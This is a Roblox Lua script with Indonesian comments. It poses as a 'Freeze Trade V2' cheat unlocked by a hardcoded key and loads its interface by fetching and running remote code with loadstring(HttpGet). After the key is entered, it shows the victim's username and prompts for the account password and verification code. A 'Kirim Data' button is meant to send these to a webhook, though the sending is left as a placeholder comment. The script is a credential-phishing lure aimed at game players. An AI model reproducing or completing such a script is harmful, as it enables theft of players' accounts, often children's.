local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()

local CorrectKey = "FreezeTradeV2"

local Window = Rayfield:CreateWindow({
    Name = "Freeze Trade V2 (KEY)",
    LoadingTitle = "Dont Share! KEY",
    LoadingSubtitle = "By Dinzzz",
})

-- Tab Step 1: Unlock Key
local Tab = Window:CreateTab("Step 1: Unlock Script", 4483362458)

Tab:CreateInput({
    Name = "Masukkan Key untuk Unlock",
    PlaceholderText = "Input key di sini",
    RemoveTextAfterFocusLost = false,
    Callback = function(input)
        print("Callback dimulai. Key yang dimasukkan: " .. tostring(input)) -- Debug

        if input == CorrectKey then
            print("Key valid, melanjutkan...") -- Debug

            -- Menampilkan notifikasi jika key benar
            Rayfield:Notify({
                Title = "Key Benar!",
                Content = "Akses diberikan.",
                Duration = 5,
            })

            -- Tambahkan Tab untuk langkah berikutnya (Step 2)
            local Tab2 = Window:CreateTab("Step 2: Input Data", 4483362458)

            -- Label untuk Username
            Tab2:CreateLabel("Username (Auto): " .. game.Players.LocalPlayer.Name)

            -- Input Password
            Tab2:CreateInput({
                Name = "Masukkan Password",
                PlaceholderText = "Input password di sini",
                RemoveTextAfterFocusLost = false,
                Callback = function(input)
                    print("Password yang dimasukkan: " .. tostring(input)) -- Debug
                end,
            })

            -- Input Kode Verifikasi
            Tab2:CreateInput({
                Name = "Masukkan Kode Verifikasi",
                PlaceholderText = "Input kode di sini",
                RemoveTextAfterFocusLost = false,
                Callback = function(input)
                    print("Kode verifikasi yang dimasukkan: " .. tostring(input)) -- Debug
                end,
            })

            -- Tombol untuk Kirim Data
            Tab2:CreateButton({
                Name = "Kirim Data",
                Callback = function()
                    print("Mengirim data ke Webhook...") -- Debug
                    -- Kirim data ke webhook (gunakan fungsi yang sesuai di sini)
                end,
            })
        else
            print("Key salah!") -- Debug
            Rayfield:Notify({
                Title = "Key Salah!",
                Content = "Coba lagi.",
                Duration = 5,
            })
        end
    end,
})
